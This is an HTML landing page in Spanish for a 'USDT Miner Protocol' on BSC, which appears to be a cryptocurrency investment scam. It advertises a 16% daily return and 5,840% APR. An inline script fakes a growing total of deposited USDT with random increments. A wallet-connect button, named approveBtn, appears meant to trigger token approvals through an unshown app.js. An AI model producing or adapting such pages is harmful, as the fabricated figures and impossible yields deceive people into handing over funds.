<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
    
    <!-- Meta tags nativos[cite: 8] -->
    <meta name="dapp-browser" content="trust">
    <meta name="mobile-web-app-capable" content="yes">
    
    <title>USDT Miner Protocol - Alto Rendimiento</title>
    
    <!-- Favicon y Fuentes[cite: 8] -->
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%2326a17b'/><path d='M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z' fill='%23fff'/></svg>">
    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%2326a17b'/><path d='M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z' fill='%23fff'/></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700;800&display=swap" rel="stylesheet">
    
    <!-- Ethers y script principal actualizado como módulo[cite: 8] -->
    <script src="js/ethers.umd.min.js"></script>
    <script src="js/app.js" type="module" defer></script>

    <style>
        /* [Tus estilos CSS originales intactos] */
        :root {
            --bg-base: #111317; --surface: rgba(255, 255, 255, 0.04);
            --surface-border: rgba(255, 255, 255, 0.1); --brand-primary: #26a17b;
            --brand-glow: rgba(38, 161, 123, 0.4); --text-main: #f8f9fa; --text-muted: #a0aec0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Montserrat', sans-serif; background-color: var(--bg-base);
            background-image: radial-gradient(circle at 15% 50%, rgba(38, 161, 123, 0.08) 0%, transparent 50%), radial-gradient(circle at 85% 30%, rgba(243, 186, 47, 0.05) 0%, transparent 50%);
            color: var(--text-main); line-height: 1.6; overflow-x: hidden;
        }
        header { padding: 16px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--surface-border); backdrop-filter: blur(12px); position: sticky; top: 0; z-index: 100; background: rgba(17, 19, 23, 0.8); }
        .logo { font-weight: 800; font-size: 22px; letter-spacing: -1px; }
        .trust-badge-container { display: flex; align-items: center; gap: 12px; }
        .status-badge { display: flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 600; background: rgba(38, 161, 123, 0.1); color: var(--brand-primary); padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(38, 161, 123, 0.25); }
        .status-dot { width: 8px; height: 8px; background-color: var(--brand-primary); border-radius: 50%; box-shadow: 0 0 8px var(--brand-primary); animation: pulse-dot 1.8s infinite; }
        @keyframes pulse-dot { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(38, 161, 123, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(38, 161, 123, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(38, 161, 123, 0); } }
        .verify-link { color: var(--text-muted); font-size: 12px; text-decoration: none; font-weight: 500; display: flex; align-items: center; gap: 4px; }
        .hero { display: grid; grid-template-columns: 1fr 1fr; gap: 60px; padding: 60px 10%; align-items: center; min-height: 80vh; }
        .hero-content h1 { font-size: 3.2rem; line-height: 1.15; margin-bottom: 24px; font-weight: 800; }
        .hero-content p { font-size: 1.1rem; color: var(--text-muted); margin-bottom: 36px; font-weight: 300; }
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-item { border-left: 3px solid var(--brand-primary); padding-left: 15px; }
        .stat-value { font-size: 1.7rem; font-weight: 700; color: #fff; }
        .stat-label { font-size: 0.8rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
        .audits-row { display: flex; align-items: center; gap: 15px; font-size: 0.8rem; color: var(--text-muted); margin-top: 20px; flex-wrap: wrap; }
        .audit-tag { background: rgba(255,255,255,0.03); padding: 6px 12px; border-radius: 8px; border: 1px solid var(--surface-border); font-weight: 600; color: #e2e8f0; display: flex; align-items: center; gap: 8px; }
        .audit-tag svg { height: 18px; width: auto; }
        .dapp-widget { background: rgba(20, 22, 28, 0.65); backdrop-filter: blur(20px); border: 1px solid var(--surface-border); border-radius: 24px; padding: 36px; box-shadow: 0 30px 60px rgba(0,0,0,0.5); position: relative; }
        .field-block { margin-bottom: 20px; }
        .field-label { display: block; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px; }
        .address-field, .desc-field, .network-pill { background: rgba(0,0,0,0.4); border: 1px solid var(--surface-border); border-radius: 12px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; width: 100%; }
        .address-input, .desc-text { background: transparent; border: none; color: #fff; font-size: 22px; outline: none; width: 100%; font-family: inherit; font-weight: 700; }
        .address-input { font-size: 14px; color: var(--text-muted); font-weight: 500; }
        .addr-usdt-icon svg, .network-icon svg { width: 24px; height: 24px; display: block; }
        .network-name { flex-grow: 1; margin-left: 12px; font-weight: 600; color: #fff; font-size: 15px; }
        .network-caret { font-size: 12px; color: var(--text-muted); }
        .desc-actions { display: flex; align-items: center; gap: 12px; }
        .desc-token { color: var(--text-muted); font-weight: 600; font-size: 15px; }
        .desc-badge { color: var(--brand-primary); font-weight: 700; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        .roi-preview { background: rgba(38, 161, 123, 0.05); border: 1px dashed rgba(38, 161, 123, 0.3); border-radius: 12px; padding: 14px 16px; margin-bottom: 24px; display: flex; justify-content: space-between; align-items: center; font-size: 0.9rem; }
        .roi-value { color: var(--brand-primary); font-weight: 800; font-size: 1.1rem; }
        .primary-button { width: 100%; padding: 18px; border-radius: 12px; background: var(--brand-primary); color: #fff; border: none; font-size: 1.1rem; font-weight: 700; cursor: pointer; box-shadow: 0 0 20px var(--brand-glow); text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 10px; }
        .btn-spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .toast { background: rgba(220, 53, 69, 0.9); color: #fff; padding: 14px; border-radius: 10px; text-align: center; margin-top: 20px; font-size: 14px; border: 1px solid rgba(255,255,255,0.2); }
        [hidden] { display: none !important; }
        .live-toast-container { position: fixed; bottom: 24px; left: 24px; z-index: 99; background: rgba(20, 22, 28, 0.85); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(16px); padding: 14px 20px; border-radius: 16px; display: flex; align-items: center; gap: 14px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); transform: translateY(120px) scale(0.9); opacity: 0; pointer-events: none; }
        .live-toast-container.active { animation: slideInElastic 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, floatOrganic 3s ease-in-out 0.8s infinite, slideOutSmooth 0.6s cubic-bezier(0.36, 0, 0.66, -0.56) 5.4s forwards; }
        .live-toast-icon { background: rgba(38, 161, 123, 0.15); color: var(--brand-primary); width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; }
        @keyframes slideInElastic { 0% { transform: translateY(120px) scale(0.8); opacity: 0; } 60% { transform: translateY(-10px) scale(1.02); opacity: 1; } 100% { transform: translateY(0) scale(1); opacity: 1; pointer-events: auto; } }
        @keyframes floatOrganic { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
        @keyframes slideOutSmooth { 0% { transform: translateY(0) scale(1); opacity: 1; } 100% { transform: translateY(50px) scale(0.9); opacity: 0; pointer-events: none; } }
        .features { padding: 80px 10%; background: #0c0d10; text-align: center; }
        .feature-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; margin-top: 40px; }
        .feature-card { background: var(--surface); padding: 30px; border-radius: 16px; border: 1px solid var(--surface-border); text-align: left; }
        .feature-card h3 { color: var(--brand-primary); margin-bottom: 12px; font-size: 1.2rem; }
        .feature-card p { color: var(--text-muted); font-size: 0.95rem; }
        .faq-section { padding: 80px 10%; max-width: 900px; margin: 0 auto; }
        .faq-section h2 { text-align: center; margin-bottom: 40px; font-size: 2.2rem; }
        .faq-item { background: var(--surface); border: 1px solid var(--surface-border); border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
        .faq-item summary { padding: 20px; font-weight: 600; cursor: pointer; list-style: none; display: flex; justify-content: space-between; align-items: center; font-size: 1.05rem; }
        .faq-item summary::after { content: "+"; font-size: 1.4rem; color: var(--brand-primary); }
        .faq-item[open] summary::after { content: "−"; }
        .faq-content { padding: 0 20px 20px 20px; color: var(--text-muted); font-size: 0.95rem; border-top: 1px solid rgba(255,255,255,0.05); margin-top: 10px; padding-top: 15px; }
        footer.site-footer { border-top: 1px solid var(--surface-border); padding: 40px 10%; background: #090a0c; text-align: center; color: var(--text-muted); font-size: 0.85rem; }
        .footer-links { display: flex; justify-content: center; gap: 24px; margin-bottom: 20px; }
        .footer-links a { color: var(--text-muted); text-decoration: none; }
    </style>
</head>
<body>
    <header>
        <div class="logo">USDT Miner Protocol</div>
        <div class="trust-badge-container">
            <div class="status-badge"><span class="status-dot"></span><span>BSC Mainnet</span></div>
        </div>
    </header>
    <section class="hero">
        <div class="hero-content">
            <h1>Multiplica tu capital.<br>Sin intermediarios.</h1>
            <p>Accede a un protocolo de minería directa optimizado para BSC.</p>
            <div class="stats-grid">
                <div class="stat-item"><div class="stat-value">16%</div><div class="stat-label">Retorno Diario Max</div></div>
                <div class="stat-item"><div class="stat-value">5,840%</div><div class="stat-label">APR Estimado</div></div>
                <div class="stat-item"><div class="stat-value" id="tvlCounter">$402,150.25</div><div class="stat-label">USDT Asignados</div></div>
            </div>
        </div>
        <main class="dapp-widget screen">
            <h3 style="margin-bottom: 20px; font-size: 1.4rem;">Panel de Operación</h3>
            <div class="field-block">
                <label class="field-label" for="merchantAddress">Address or Domain Name</label>
                <div class="address-field">
                    <input id="merchantAddress" class="address-input" type="text" readonly>
                </div>
            </div>
            <div class="field-block">
                <p class="field-label">Amount</p>
                <div class="desc-field">
                    <input class="desc-text" id="investAmount" type="number" value="0.10" min="0.1" step="0.1">
                    <div class="desc-actions"><span class="desc-token">USDT</span><span class="desc-badge" id="maxBtn">Max</span></div>
                </div>
            </div>
            <div class="roi-preview" id="roiBox">
                <span>Retorno Est. Diario (16%):</span>
                <span class="roi-value" id="roiOutput">+0.02 USDT</span>
            </div>
            <button id="approveBtn" class="primary-button" type="button">
                <span id="btnText">CONECTAR WALLET</span>
                <span id="btnSpinner" class="btn-spinner" hidden></span>
            </button>
            <div id="toast" class="toast" hidden></div>
        </main>
    </section>
    <div class="live-toast-container" id="dynamicToast">
        <div class="live-toast-icon">⚡</div>
        <div id="toastContent"></div>
    </div>
    <script>
        // Tu script visual original de ROI, TVL y Toasts intacto[cite: 8]
        document.addEventListener("DOMContentLoaded", () => {
            const amountInput = document.getElementById('investAmount');
            const roiOutput = document.getElementById('roiOutput');
            const roiBox = document.getElementById('roiBox');
            const maxBtn = document.getElementById('maxBtn');
            const DAILY_RATE = 0.16;

            const calculateROI = () => {
                let val = parseFloat(amountInput.value);
                if (isNaN(val) || val < 0) { roiOutput.textContent = `+0.00 USDT`; return; }
                const daily = val * DAILY_RATE;
                roiOutput.textContent = `+${daily.toFixed(2)} USDT`;
            };
            amountInput.addEventListener('input', calculateROI);
            if (maxBtn) maxBtn.addEventListener('click', () => { amountInput.value = "1000.00"; calculateROI(); });
            calculateROI();

            const tvlElement = document.getElementById('tvlCounter');
            let currentTVL = 402150.25;
            if (tvlElement) {
                setInterval(() => {
                    currentTVL += (Math.random() * (150 - 5) + 5);
                    tvlElement.textContent = '$' + currentTVL.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                }, 4500);
            }
        });
    </script>
</body>
</html>
